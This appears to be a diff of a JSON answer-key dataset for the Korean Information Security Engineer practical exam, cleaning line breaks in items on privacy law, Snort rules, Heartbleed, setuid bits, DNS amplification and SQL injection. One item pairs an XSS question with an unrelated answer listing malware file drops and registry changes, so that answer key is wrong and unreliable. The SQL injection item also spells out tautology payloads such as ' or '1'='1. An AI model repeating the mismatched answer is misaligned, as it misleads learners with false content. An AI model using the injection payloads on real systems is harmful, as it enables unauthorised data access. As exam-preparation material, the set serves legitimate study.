       "question": "A 시의 어르신 교통카드 신청서 안내문에서 개인정보보호법에 위반되는 사항 4 가지를 찾아서 설명하시오.\n1) 개인정보 수집 및 이용 내역(필수) : 수집항목(주민등록번호 포함), 목적(본인확인), 기간(영구보관)\n* 동의를 거부할 권리가 있다는 사실 및 동의 거부 시 불이익 명시함.\n2) 제 3 자 제공:\n제공기관(유관기관), 제공내역(주민등록번호 포함), 제공목적, 기간(교통카드 만료시까지)\n3) 위탁 : 위탁기관(OO 신용카드), 위탁업무(교통카드발급업무)\n4) 위 3 가지 항목에 대하여 동의하는지 확인 요청",
-      "answer": "1) 주민등록번호 수집 및 3 자 제공 불가(개인정보보호법 제24 조의 2) \r  \r 2) 개인정보 보관 기간이 영구로 설정  \r  \r 3) 제3 자 제공 시 동의를 거부할 권리가 있다는 사실 및 거부에 따른 불이익에 대한 \r 설명이 누락됨 \r  \r 4) 제3 자 제공 기관의 명칭이 불분명하게 기술",
+      "answer": "1) 주민등록번호 수집 및 3 자 제공 불가(개인정보보호법 제24 조의 2)\n\n2) 개인정보 보관 기간이 영구로 설정\n\n3) 제3 자 제공 시 동의를 거부할 권리가 있다는 사실 및 거부에 따른 불이익에 대한 설명이 누락됨\n\n4) 제3 자 제공 기관의 명칭이 불분명하게 기술",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 349
@@ -130,7 +130,7 @@
       "original_id": 54,
       "type": "practical",
       "question": "유닉스 계정 패스워드 임곗값 설정에서 다음 옵션의 의미를 설명하시오.\n[보기]\n(deny=5, unlock_time=120, no_magic_root, reset)",
-      "answer": "deny= 5 : 인증 실패 임곗값을 5 회로 설정(5 회 실패 시 계정 잠김) \r  \r unlock_time =120 : 계정 잠김 후 마지막 인증 실패 시작으로부터 120 초가 지나면 \r 자동으로 계정 잠금 해제 \r  \r no_magic_root : root 계정은 잠김 설정 예외 \r  \r reset : 접속 시도 성공 시 실패 회수를 초기화함. \r  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "answer": "deny= 5 : 인증 실패 임곗값을 5 회로 설정(5 회 실패 시 계정 잠김)\n\nunlock_time =120 : 계정 잠김 후 마지막 인증 실패 시작으로부터 120 초가 지나면 자동으로 계정 잠금 해제\n\nno_magic_root : root 계정은 잠김 설정 예외\n\nreset : 접속 시도 성공 시 실패 회수를 초기화함.\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 350
@@ -139,7 +139,7 @@
       "original_id": 59,
       "type": "practical",
       "question": "아파치 설정에서 다음 옵션들의 의미에 대하여 설명하시오.\n1) timeout 300\n2) maxkeepaliverequests 100\n3) Directoryindex index.htm, index.html, index.php\n4) ErrorLog \"경로\"",
-      "answer": "1) 클라이언트와 서버 간에 300\r 초(5\r 분) 동안 아무런 메시지가 발생하지 않으면 \r 타임아웃을 시키고 연결을 끊음 \r  \r 2) Keepalive 값이 On 인 경우 클라이언트와 연결된 작업의 최대 개수를 100 개로 제한함. \r 해당 회수를 초과하면 현재 프로세스는 종료하고 다른 프로세스가 처리함 \r  \r 3) 웹 디렉토리 접근 시 인식되는 인덱스 파일의 순서를 index.htm, index.html, \r index.php 순으로 지정함. \r  \r 4) Error 발생 시 로그 파일의 위치를 지정함. \r  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "answer": "1) 클라이언트와 서버 간에 300 초(5 분) 동안 아무런 메시지가 발생하지 않으면 타임아웃을 시키고 연결을 끊음\n\n2) Keepalive 값이 On 인 경우 클라이언트와 연결된 작업의 최대 개수를 100 개로 제한함.\n해당 회수를 초과하면 현재 프로세스는 종료하고 다른 프로세스가 처리함\n\n3) 웹 디렉토리 접근 시 인식되는 인덱스 파일의 순서를 index.htm, index.html, index.php 순으로 지정함.\n\n4) Error 발생 시 로그 파일의 위치를 지정함.\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 355
@@ -148,7 +148,7 @@
       "original_id": 60,
       "type": "practical",
       "question": "XSS 공격을 탐지하기 위한 다음의 Snort rule 에 대하여 다음 물음에 답하시오.\n[보기]\nAlert any anry\n->\nany 80 (msg \"XSS\";content \"GET\";offset:1;depth:3;content:\"/login.php<script>XSS\";distance 1;)\n\n1) content:\"GET\";offset:1 depth:3 의 의미는?\n2) content:\"/login.php<script>XSS\";distance 1; 의 의미는?\n3) 바이너리로 전송된 패킷(L 이 대문자임)을 참고하여 위의 룰로 탐지 안될 경우 어떻게 수정해야 하는지 기술하시오.",
-      "answer": "1) 전송된 패킷의 처음 1 바이트를 띄고 3 바이트를 검사해서 GET 을 찾으라는 의미 \r  \r 2) 이전 메시지(GET)를 찾은 위치에서 1 바이트를 띄고 content 안에 기술된 문자열을 \r 찾으라는 의미 \r  \r 3) offset:1 을 offset:0 으로 변경하거나 offset 옵션을 삭제. 그리고, nocase 옵션을 \r 추가하거나 login 을 Login 으로 변경",
+      "answer": "1) 전송된 패킷의 처음 1 바이트를 띄고 3 바이트를 검사해서 GET 을 찾으라는 의미\n\n2) 이전 메시지(GET)를 찾은 위치에서 1 바이트를 띄고 content 안에 기술된 문자열을 찾으라는 의미\n\n3) offset:1 을 offset:0 으로 변경하거나 offset 옵션을 삭제. 그리고, nocase 옵션을 추가하거나 login 을 Login 으로 변경",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 356
@@ -157,7 +157,7 @@
       "original_id": 65,
       "type": "practical",
       "question": "SW 보안 약점 진단원이 CBD 기반 SW 개발 공정 중 분석 단계 진단 시 검토해야 할 산출물 4 가지와 그 내용을 간략히 설명하시오.",
-      "answer": "1) 요구사항 정의서(or 명세서) : SW 개발에 필요한 기능, 비기능 요구사항을 도출하여 \r 발주사와 내용을 합의 후 체계적으로 작성한 문서 \r  \r 2) 요구사항 추적표(or 추적매트릭스) : 도출된 요구사항을 기반으로 개발 각 단계별 \r 산출물들이 일관성 있게 작성되었는지 추적하기 위한 문서 \r  \r 3) 유즈케이스 다이어그램 : 액터(사용자)가 사용할 수 있는 기능과, 시스템이 제공하는 \r 기능을 도식화하여 보여주는 문서 \r  \r 4) 유즈케이스 명세서 : 유즈케이스 다이어그램에 담긴 액터와 유즈케이스간 상호작용과 \r 내부업무 흐름을 상세하게 설명하는 문서 \r  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "answer": "1) 요구사항 정의서(or 명세서) : SW 개발에 필요한 기능, 비기능 요구사항을 도출하여 발주사와 내용을 합의 후 체계적으로 작성한 문서\n\n2) 요구사항 추적표(or 추적매트릭스) : 도출된 요구사항을 기반으로 개발 각 단계별 산출물들이 일관성 있게 작성되었는지 추적하기 위한 문서\n\n3) 유즈케이스 다이어그램 : 액터(사용자)가 사용할 수 있는 기능과, 시스템이 제공하는 기능을 도식화하여 보여주는 문서\n\n4) 유즈케이스 명세서 : 유즈케이스 다이어그램에 담긴 액터와 유즈케이스간 상호작용과 내부업무 흐름을 상세하게 설명하는 문서\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 361
@@ -166,7 +166,7 @@
       "original_id": 66,
       "type": "practical",
       "question": "Robot.txt 파일에 대하여 다음 물음에 답하시오.\n(1) Robot.txt 파일의 용도\n(2) 아래 설정값의 의미 useragent : yeti useragent : googlebot (가) allow : /\n\nuseragent : googlebot-image (나) disallow : /admin/ (다) disallow : /*.pdf$",
-      "answer": "(1) 검색엔진에서 자동 크롤링 도구에 대하여 접근 허용 여부를 제어하기 위한 파일 \r  \r (2-가) 검색 엔진 로봇(yeti, googlebot)에 대하여 root 디렉토리(/) 밑의 모든 파일 및 \r 디렉토리의 크롤링을 허용 \r (2-나) 검색 엔진 로봇(googlebot-image)에 대하여 /admin 폴더 크롤링을 허용하지 않음. \r (2-다) 검색 엔진 로봇(googlebot-image)에 대하여 pdf 확장자를 가진 파일에 대하여 \r 크롤링을 허용하지 않음",
+      "answer": "(1) 검색엔진에서 자동 크롤링 도구에 대하여 접근 허용 여부를 제어하기 위한 파일\n\n(2-가) 검색 엔진 로봇(yeti, googlebot)에 대하여 root 디렉토리(/) 밑의 모든 파일 및 디렉토리의 크롤링을 허용 (2-나) 검색 엔진 로봇(googlebot-image)에 대하여 /admin 폴더 크롤링을 허용하지 않음.\n(2-다) 검색 엔진 로봇(googlebot-image)에 대하여 pdf 확장자를 가진 파일에 대하여 크롤링을 허용하지 않음",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 362
@@ -175,7 +175,7 @@
       "original_id": 71,
       "type": "practical",
       "question": "윈도우 PE(Portable Executable) 파일은 윈도우 7 과 같이 NT 계열 운영체제에서 실행 가능한 파일 포맷이다. PE 파일은 실행 코드, 데이터, 리소스 및 메타데이터를 포함하는 구조를 가지며, 일반적으로 .exe(executable), .dll(dynamic link library), .sys(driver) 확장자를 가진 파일들을 포함한다. 악성파일의 경우에도 윈도우 OS 에서 실행되기 위해 PE 포맷을 사용하는데, 악성코드 작성자는 PE 파일을 난독화하거나, PE 헤더와 섹션 정보를 변형하여 디버깅 및 분석을 어렵게 만든다. 이러한 악성파일을 분석하는 아래 3 가지 방법에 대하여 설명 하시오.\n1) 자동화 분석\n2) 반자동화 분석\n3) 수동 분석",
-      "answer": "1) 자동 분석은 악성 파일 분석 과정에서 수작업을 최소화하고 효율성을 극대화하기 위해 \r 자동화된 도구와 기술을 사용하는 방법임.  \r • \r PEiD, IDA Pro, YARA 와 같은 정적 분석 도구를 이용하면 파일 헤더, 섹션, 코드 \r 패턴 등을 자동으로 분석하여 악성 여부 판별이 가능함 \r • \r Cuckoo Sandbox, Any.Run 과 같은 동적 분석 도구를 이용하면, 악성 파일을 \r 격리된 환경에서 실행하여, 파일의 행위, 네트워크 활동, 시스템 변경 사항을 \r 자동으로 기록하고 분석 가능함. \r  \r 2) 반자동화 분석은 자동화된 도구를 사용하여 초기 분석을 수행하고, 분석가가 \r 추가적으로 세부 사항을 수동으로 조사하여 정확성을 높이는 방법임. \r • \r Cuckoo Sandbox, Any.Run 과 같은 자동화 도구를 이용하여 파일을 격리된 \r 환경에서 실행하고 초기 행동 분석을 자동으로 수행함. 분석가는 이 결과를 \r 바탕으로 추가 조사 대상을 선정함. \r • \r 디스어셈블러(예: IDA Pro, Ghidra)를 사용하여 자동화 도구가 식별한 의심스러운 \r 코드나 행동을 중심으로 코드의 특정 부분을 수동으로 분석함. \r  \r 3) 수동 분석은 주로 분석가의 전문 지식과 경험을 바탕으로 파일을 직접 분석하는 \r 방법임. 깊이 있는 조사와 상세한 이해를 필요로 하는 복잡한 악성코드 분석에 유용함. \r • \r 초기 조사 : 파일의 기본 속성(예: 파일 크기, 해시 값, 타임스탬프 등)을 확인하고, \r PE 헤더 등을 분석하여 실행 파일인지, 스크립트인지, 다른 형식인지 확인하는 \r 초기 조사를 수행함. \r • \r 정적 분석 : PE 파일의 경우, DOS 헤더, PE 헤더, 섹션 헤더 등을 검사하여 파일 \r 구조를 이해하고, IDA Pro, Ghidra, Radare2 등의 디스어셈블러를 사용하여 파일의 \r 기계어 코드를 어셈블리 코드로 변환하고 분석함. 이를 통해 주요 함수, 진입점, \r 코드 흐름 등을 파악함. \r • \r 동적 분석 : OllyDbg, x64dbg 같은 디버거를 사용하여 악성코드를 단계별로 \r 실행하면서 코드의 동작을 추적함. 특정 행동을 유발하는 코드 부분을 식별하고 \r 분석함. \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "answer": "1) 자동 분석은 악성 파일 분석 과정에서 수작업을 최소화하고 효율성을 극대화하기 위해 자동화된 도구와 기술을 사용하는 방법임.\n• PEiD, IDA Pro, YARA 와 같은 정적 분석 도구를 이용하면 파일 헤더, 섹션, 코드 패턴 등을 자동으로 분석하여 악성 여부 판별이 가능함 • Cuckoo Sandbox, Any.Run 과 같은 동적 분석 도구를 이용하면, 악성 파일을 격리된 환경에서 실행하여, 파일의 행위, 네트워크 활동, 시스템 변경 사항을 자동으로 기록하고 분석 가능함.\n\n2) 반자동화 분석은 자동화된 도구를 사용하여 초기 분석을 수행하고, 분석가가 추가적으로 세부 사항을 수동으로 조사하여 정확성을 높이는 방법임.\n• Cuckoo Sandbox, Any.Run 과 같은 자동화 도구를 이용하여 파일을 격리된 환경에서 실행하고 초기 행동 분석을 자동으로 수행함. 분석가는 이 결과를 바탕으로 추가 조사 대상을 선정함.\n• 디스어셈블러(예: IDA Pro, Ghidra)를 사용하여 자동화 도구가 식별한 의심스러운 코드나 행동을 중심으로 코드의 특정 부분을 수동으로 분석함.\n\n3) 수동 분석은 주로 분석가의 전문 지식과 경험을 바탕으로 파일을 직접 분석하는 방법임. 깊이 있는 조사와 상세한 이해를 필요로 하는 복잡한 악성코드 분석에 유용함.\n• 초기 조사 : 파일의 기본 속성(예: 파일 크기, 해시 값, 타임스탬프 등)을 확인하고, PE 헤더 등을 분석하여 실행 파일인지, 스크립트인지, 다른 형식인지 확인하는 초기 조사를 수행함.\n• 정적 분석 : PE 파일의 경우, DOS 헤더, PE 헤더, 섹션 헤더 등을 검사하여 파일 구조를 이해하고, IDA Pro, Ghidra, Radare2 등의 디스어셈블러를 사용하여 파일의 기계어 코드를 어셈블리 코드로 변환하고 분석함. 이를 통해 주요 함수, 진입점, 코드 흐름 등을 파악함.\n• 동적 분석 : OllyDbg, x64dbg 같은 디버거를 사용하여 악성코드를 단계별로 실행하면서 코드의 동작을 추적함. 특정 행동을 유발하는 코드 부분을 식별하고 분석함.\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 367
@@ -184,7 +184,7 @@
       "original_id": 72,
       "type": "practical",
       "question": "사용자가 윈도우 명령 처리기(cmd.exe)를 실행하려고 할 때 다음과 같이 사용자 계정 콘트롤(UAC) 팝업창이 표시되었다. 관련하여 질문에 답하시오.\n[보기]\n[사용자 계정 콘트롤 팝업창]\n----------------------------------------------------------------------------------------- 다음 프로그램이 이 컴퓨터를 변경할 수 있도록 허용하시겠습니까?\n- 프로그램 이름 : Windows 명령 처리기\n- 확인된 게시자 : Microsoft Windows\n- 파일 일원본 : 이 컴퓨터의 하드 드라이브\n----------------------------------------------------------------------------------------- 계속 하려면 관리자 암호를 입력하고 [예]를 클릭하십시오.\n* [예 버튼]은 비활성화 상태이고 [아니오 버튼]만 활성화되어 있음.\n1) 사용자가 윈도우 명령 처리기를 실행한 의도는 무엇인가?\n2) 사용자 계정 콘트롤 팝업창에서 [예 버튼]이 비활성화된 이유는 무엇인가?",
-      "answer": "1) 윈도우 명령 처리기를 관리자 권한으로 실행하여, 사용자의 현재 권한으로 실행할 수 \r 없는 명령어를 처리하기 위함이다. \r  \r 2) 윈도우 관리자 계정이 정상이 아닌 경우(비활성화, 삭제) 또는 윈도우 시스템 파일이 \r 손상된 경우",
+      "answer": "1) 윈도우 명령 처리기를 관리자 권한으로 실행하여, 사용자의 현재 권한으로 실행할 수 없는 명령어를 처리하기 위함이다.\n\n2) 윈도우 관리자 계정이 정상이 아닌 경우(비활성화, 삭제) 또는 윈도우 시스템 파일이 손상된 경우",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 368
@@ -193,7 +193,7 @@
       "original_id": 77,
       "type": "practical",
       "question": "아래 취약점 점검 결과를 기반으로, 다음 물음에 답하시오.\n[보기]\n[취약점 점검 결과]\n# openssl version -a OpenSSL 1.0.1 14 May 2012\n\n#openssl s_client -connect domain.com:8443 -tlsextdebug -debug -state | grep -i heatbeat SSL_connect:before SSL initialization SSL_connect:SSLv3/TLS write client hello SSL_connect:SSLv3/TLS read server hello TLS server extension \"heartbeat\" (id=15), len=1 ....................\n1) 취약점 명은?\n2) 시스템적으로 해당 취약점을 조치하는 방법은?\n3) 서비스적으로 해당 취약점을 조치하는 방법은?",
-      "answer": "1) 하트블리드(Heart Bleed) \r  \r 2-1) OpenSSL 버전을 취약점이 패치된 상위 버전(예:1.0.1g)으로 업데이트 \r 2-2) \r 운영 \r 환경의 특수성으로 \r 인하여 \r 패키지 \r 형태의 \r 업데이트가 \r 어려운 \r 경우, \r Heartbeat 를 사용하지 않도록 컴파일 옵션을 설정하여 재컴파일 \r  \r 3-1) 서버측 SSL 비밀키가 유출되었을 가능성이 있으므로, 서버 인증서 재발급 검토 \r 3-2) 취약점 조치 완료 후 사용자들의 비밀번호 재설정을 안내하여 탈취된 계정을 악용한 \r 추가 피해 방지 \r  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "answer": "1) 하트블리드(Heart Bleed)\n\n2-1) OpenSSL 버전을 취약점이 패치된 상위 버전(예:1.0.1g)으로 업데이트 2-2) 운영 환경의 특수성으로 인하여 패키지 형태의 업데이트가 어려운 경우, Heartbeat 를 사용하지 않도록 컴파일 옵션을 설정하여 재컴파일\n\n3-1) 서버측 SSL 비밀키가 유출되었을 가능성이 있으므로, 서버 인증서 재발급 검토 3-2) 취약점 조치 완료 후 사용자들의 비밀번호 재설정을 안내하여 탈취된 계정을 악용한 추가 피해 방지\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 373
@@ -202,7 +202,7 @@
       "original_id": 78,
       "type": "practical",
       "question": "setuid, setgid, sticky bit 에 대해 아래 파일 및 디렉토리에 관하여 소유자(그룹)와 접근권한 관계로 각각 설명하시오. (단, 세번째 /tmp 디렉토리 내의 파일에 대한 root 가 아닌 사용자 권한으로 설명하시오.)\n1) -r-sr-xr-x root sys /usr/bin/passwd\n2) -r-xr-sr-x root mail /usr/bin/mail\n3) drwxrwxrwt sys sys /tmp",
-      "answer": "1) passwd 실행파일의 경우 소유자(owner) 권한이 r-s 로 setuid 가 설정되어 있으며, \r other 사용자 권한이 r-x 로 실행권한이 있으므로, 모든 사용자가 passwd 명령어를 실행 \r 시 소유자인 root 권한으로 수행이 된다. \r  \r 2) mail 파일의 경우 그룹(Group) 권한이 r-s 로 setgid 가 설정되어 되어있으므로, 해당 \r 파일을 실행 시 mail 그룹 권한을 가지고 수행된다. \r  \r 3) tmp 디렉토리의 경우 rwx 권한 + sticky bit 설정이 되어 있으므로 해당 디렉토리에 \r 생성된 디렉토리 혹은 파일은 누구든지 읽기/쓰기는 가능하지만 삭제는 소유주와 root 만 \r 가능.",
+      "answer": "1) passwd 실행파일의 경우 소유자(owner) 권한이 r-s 로 setuid 가 설정되어 있으며, other 사용자 권한이 r-x 로 실행권한이 있으므로, 모든 사용자가 passwd 명령어를 실행 시 소유자인 root 권한으로 수행이 된다.\n\n2) mail 파일의 경우 그룹(Group) 권한이 r-s 로 setgid 가 설정되어 되어있으므로, 해당 파일을 실행 시 mail 그룹 권한을 가지고 수행된다.\n\n3) tmp 디렉토리의 경우 rwx 권한 + sticky bit 설정이 되어 있으므로 해당 디렉토리에 생성된 디렉토리 혹은 파일은 누구든지 읽기/쓰기는 가능하지만 삭제는 소유주와 root 만 가능.",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 374
@@ -211,7 +211,7 @@
       "original_id": 83,
       "type": "practical",
       "question": "HTTP Flooding 공격의 특징은 대부분 웹 서버 공격 트래픽에서 최초 웹 페이지에 대해 웹 접속 요청을 폭주시켜 세션자원을 소진시키는 방법이다. 이러한 공격에 대한 snort 탐지룰(Rule)이다. 이 snort 룰을 보고 각각에 대하여 답하시오.\n[보기]\nalert tcp any any -> any any {msg:\"GET Flooding\"; content:\"GET /HTTP1.\"; nocase;\ndepth 13; threshold: type threshold, track by_dst, count 10, seconds 1; sid: 10000999}\n1) 해당 룰의 이벤트 명은?\n2) nocase 가 의미하는 것은?\n3) content \"GET /HTTP1.\"가 의미하는 것은?\n4) threshold: type threshold, track by_dst, count 10, seconds 1 가 의미하는 것은?",
-      "answer": "1) Get Flooding \r 2) 대소문자 구분하지 않고 탐지 \r 3) 패킷 페이로드 GET /HTTP1. 이라는 문자열이 있는 경우 탐지 \r 4) 목적지 ip 주소를 기준으로 부터 1 초 동안 10 번째 마다 alert action 수행",
+      "answer": "1) Get Flooding\n2) 대소문자 구분하지 않고 탐지\n3) 패킷 페이로드 GET /HTTP1. 이라는 문자열이 있는 경우 탐지\n4) 목적지 ip 주소를 기준으로 부터 1 초 동안 10 번째 마다 alert action 수행",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 379
@@ -220,7 +220,7 @@
       "original_id": 84,
       "type": "practical",
       "question": "위험분석을 수행할 때 정보자산을 그룹핑한 후 수행하기도 한다. 이때 정보자산 그룹핑의 개념과 정보자산 그룹핑을 수행한 후 위험분석 수행할 때의 장점을 각각 설명하시오.",
-      "answer": "- 정보자산 그룹핑 : 조사된 자산을 비밀성, 무결성, 가용성 평가 결과에 기초하여 자산의 \r 유형, 보안특성, 중요도가 같은 것을 묶어낸 공통 자산 그룹으로 명시한 것 \r  \r - 장점 : 관련 위험 및 취약성 평가와 위험 평가를 수행할 때 자산 유형, 보안특성, \r 중요도에 따라 결과가 달라짐으로 같은 결과가 나오는 자산에 대하여 동일한 작업이 \r 반복되는 것을 방지 \r  \r  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "answer": "- 정보자산 그룹핑 : 조사된 자산을 비밀성, 무결성, 가용성 평가 결과에 기초하여 자산의 유형, 보안특성, 중요도가 같은 것을 묶어낸 공통 자산 그룹으로 명시한 것\n\n- 장점 : 관련 위험 및 취약성 평가와 위험 평가를 수행할 때 자산 유형, 보안특성, 중요도에 따라 결과가 달라짐으로 같은 결과가 나오는 자산에 대하여 동일한 작업이 반복되는 것을 방지\n\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 380
@@ -229,7 +229,7 @@
       "original_id": 90,
       "type": "practical",
       "question": "다음 내용을 참조하여 질문에 답하시오.\n[보기]\nHTTP 웹 서버에 접속하였지만 로그인이 되지 않는다. 동일한 출발지를 갖는 IP 가 짧은 시간에 많은 양의 트래픽을 지속적으로 발생시킨다.\n(해당 패킷)\nGET / HTTP/1.1 Host: 10.10.10.25 User-agent: Mozila Content-length: 42\n1) 어떤 유형의 공격인가?\n2) 해당 공격으로 어떤 영향을 받는가?",
-      "answer": "1) HTTP Get Flooding \r  \r 2) 대량의 GET 요청을 지속적으로 전송하므로 서버의 세션을 모두 소진하여 정상적인 \r 사용자가 접속 요청 시 접속이 불가능 \r  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "answer": "1) HTTP Get Flooding\n\n2) 대량의 GET 요청을 지속적으로 전송하므로 서버의 세션을 모두 소진하여 정상적인 사용자가 접속 요청 시 접속이 불가능\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 386
@@ -238,7 +238,7 @@
       "original_id": 95,
       "type": "practical",
       "question": "개인정보보호법에 따른 개인정보 안전성 확보조치 방안 6 개를 서술하시오.",
-      "answer": "1. 개인정보의 안전한 처리를 위한 다음 각 목의 내용을 포함하는 내부 관리계획의 \r 수립ㆍ시행 및 점검 \r 가. 법 제28 조제1 항에 따른 개인정보취급자(이하 “개인정보취급자”라 한다)에 대한 \r 관리ㆍ감독 및 교육에 관한 사항 \r 나. 법 제31 조에 따른 개인정보 보호책임자의 지정 등 개인정보 보호 조직의 \r 구성ㆍ운영에 관한 사항 \r 다. 제2 호부터 제8 호까지의 규정에 따른 조치를 이행하기 위하여 필요한 세부 사항",
+      "answer": "1. 개인정보의 안전한 처리를 위한 다음 각 목의 내용을 포함하는 내부 관리계획의 수립ㆍ시행 및 점검\n가. 법 제28 조제1 항에 따른 개인정보취급자(이하 “개인정보취급자”라 한다)에 대한 관리ㆍ감독 및 교육에 관한 사항\n나. 법 제31 조에 따른 개인정보 보호책임자의 지정 등 개인정보 보호 조직의 구성ㆍ운영에 관한 사항\n다. 제2 호부터 제8 호까지의 규정에 따른 조치를 이행하기 위하여 필요한 세부 사항",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 391
@@ -247,7 +247,7 @@
       "original_id": 102,
       "type": "practical",
       "question": "특정 웹 페이지에 실행 가능한 스크립트를 삽입하여 페이지 방문자의 개인정보나 쿠키정보를 탈취하여 전송하는 공격 및 동작 원리, 이를 공격을 보안하기 위한 방안을 서술하시오.",
-      "answer": "- a.bat, msnsrv.exe, wassa.exe 파일 생성 \r - 시스템 기동 시 자동 실행되도록 레지스트리 값 추가 \r - 탐색기의 Hidden 속성의 파일 보이기 속성 해제 \r - 커맨드 셀 cmd.exe 를 레지스트리에서 삭제 \r - 커맨드 셀 실행 시에 msnsrv.exe 가 실행되도록 레지스트리 추가 \r - 윈도우 방화벽에서 TCP 포트 9070 을 허용",
+      "answer": "- a.bat, msnsrv.exe, wassa.exe 파일 생성\n- 시스템 기동 시 자동 실행되도록 레지스트리 값 추가\n- 탐색기의 Hidden 속성의 파일 보이기 속성 해제\n- 커맨드 셀 cmd.exe 를 레지스트리에서 삭제\n- 커맨드 셀 실행 시에 msnsrv.exe 가 실행되도록 레지스트리 추가\n- 윈도우 방화벽에서 TCP 포트 9070 을 허용",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 398
@@ -256,7 +256,7 @@
       "original_id": 107,
       "type": "practical",
       "question": "웹 서버에서 다음과 같은 SQL SELECT 문이 수행된다고 할 때 아래의 항목에 대해서 설명하시오.\n[보기]\nSELECT password FROM user WHERE username='qfrankr'\n(1) 쿼리의 결과는 무엇인가?\n(2) 모든 사용자의 정보를 획득하기 위해 'qfrankr' 부분에 들어갈 예시를 작성하시오.\n(3) 위 예시가 가능한 이유는 무엇인가?",
-      "answer": "(1) qfrankr 사용자에 대한 패스워드 정보를 확인한다. \r (2) ' or 'a'='a 또는 ' or '1'='1 등 조건절을 참으로 만드는 다양한 조건값이 가능.\\ \r (3) 조건절이 WHERE username='' or '1'='1'이 되므로 항상 결과가 참이 된다. \r  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "answer": "(1) qfrankr 사용자에 대한 패스워드 정보를 확인한다.\n(2) ' or 'a'='a 또는 ' or '1'='1 등 조건절을 참으로 만드는 다양한 조건값이 가능.\\\n(3) 조건절이 WHERE username='' or '1'='1'이 되므로 항상 결과가 참이 된다.\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 403
@@ -265,7 +265,7 @@
       "original_id": 108,
       "type": "practical",
       "question": "DNS 증폭 공격(DNS Amplification DDoS Attack) 중 IP 기반 공격에 대해 설명하고 IP 기반 공격을 사용하는 이유와 사용하는 레코드 type 을 기술하시오.",
-      "answer": "- IP 기반 DNS 증폭 공격기법: IP Spoofing 을 사용하여 출발지(Source) IP 를 공격하고자 \r 하는 희생자(victim)서버의 IP 로 위조한 후 다수의 DNS 질의를 수행한다 \r  \r - 증폭 이유: 공격자의 DNS 질의에 대한 응답 패킷을 IP Spoofing 된 희생자 서버가 \r 수신하게 되므로 서비스거부 공격 가능 \r  \r - DNS 질의 타입: ANY 타입 or TXT 레코드 타입 \r  \r - 해당 레코드 타입 사용 이유: any 또는 txt type 의 경우 요청하는 패킷의 크기와 응답 \r 패킷 크기가 비대칭적으로 응답 패킷 사이즈가 크게 때문에 작은 컴퓨팅 리소스로 \r 효율적인 공격이 가능 \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
+      "answer": "- IP 기반 DNS 증폭 공격기법: IP Spoofing 을 사용하여 출발지(Source) IP 를 공격하고자 하는 희생자(victim)서버의 IP 로 위조한 후 다수의 DNS 질의를 수행한다\n\n- 증폭 이유: 공격자의 DNS 질의에 대한 응답 패킷을 IP Spoofing 된 희생자 서버가 수신하게 되므로 서비스거부 공격 가능\n\n- DNS 질의 타입: ANY 타입 or TXT 레코드 타입\n\n- 해당 레코드 타입 사용 이유: any 또는 txt type 의 경우 요청하는 패킷의 크기와 응답 패킷 크기가 비대칭적으로 응답 패킷 사이즈가 크게 때문에 작은 컴퓨팅 리소스로 효율적인 공격이 가능\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n1-12 회 https://information-security.tistory.com/",
       "explanation": "",
       "session": "[문제+답] 1회~28회 정보보안기사 실기 실무형",
       "id": 404
@@ -274,7 +274,7 @@
       "original_id": 113,
       "type": "practical",
       "question": "개인정보 보호법에 따라 개인정보처리자는 개인정보가 분실ㆍ도난ㆍ유출(이하 이 조에서 “유출 등”이라 한다)되었음을 알게 되었을 때에는 지체 없이 해당 정보주체에게 다음 각 호의 사항을 알려야 한다. 이때 알려야 할 사항 5 가지를 기술하시오.",
-      "answer": "(1) 유출 등이 된 개인정보의 항목 \r (2) 유출 등이 된 시점과 그 경위 \r (3) 유출 등으로 인하여 발생할 수 있는 피해를 최소화하기 위하여 정보주체가 할 수 \r 있는 방법 등에 관한 정보 \r (4) 개인정보처리자의 대응조치 및 피해 구제절차 \r (5) 정보주체에게 피해가 발생한 경우 신고 등을 접수할 수 있는 담당부서 및 연락 \r  \r  \r  \r \r \r 1-12 회 https://information-security.tistory.com/",
